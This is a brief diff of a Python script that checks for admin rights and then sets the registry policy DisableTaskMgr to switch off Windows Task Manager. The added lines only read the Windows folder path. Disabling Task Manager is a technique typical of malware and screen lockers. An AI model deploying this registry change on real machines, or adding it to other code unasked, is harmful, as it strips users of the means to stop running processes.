@@ -19,6 +19,8 @@ if not is_admin():
     )
     sys.exit()
 
+windows_folder = os.environ.get("WINDIR")
+
 key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
 key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
 winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
